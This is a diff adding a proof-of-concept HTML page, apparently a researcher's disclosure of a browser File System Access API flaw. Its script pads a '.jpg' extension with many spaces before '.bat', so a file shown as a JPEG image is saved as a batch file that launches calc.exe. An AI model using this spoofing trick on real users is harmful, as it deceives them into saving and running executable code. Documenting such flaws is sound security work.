@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>File System Access API - Hide extension by many white spaces</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+</head>
+
+<body>
+    <h3>File System Access API - Hide extension by many white spaces</h3>
+    <h4>Found by Maciej Pulikowski</h4>
+
+    <hr>
+    <h3>Code example/proof:</h3>
+    <div style="display: flex; flex-direction: column">
+        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
+        <div>
+            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
+        </div>
+
+    </div>
+    <script>
+        const butSaveNewFile = document.getElementById('addNewFile')
+        butSaveNewFile.addEventListener('click', async () => {
+            const options = {
+                types: [
+                    {
+                        description:
+                            'JPEG Image (*.jpeg)',
+                        accept: {
+                            'text/plain': ['.jpg                                                                                                                     .bat']
+                        },
+                        content: 'C:\\Windows\\system32\\calc.exe'
+                    }
+                ],
+                excludeAcceptAllOption: true
+            }
+            const handle = await window.showSaveFilePicker(options)
+            const writable = await handle.createWritable()
+            await writable.write('C:\\Windows\\system32\\calc.exe')
+            await writable.close()
+            alert('File saved')
+        })
+    </script>
+</body>
+
+</html>
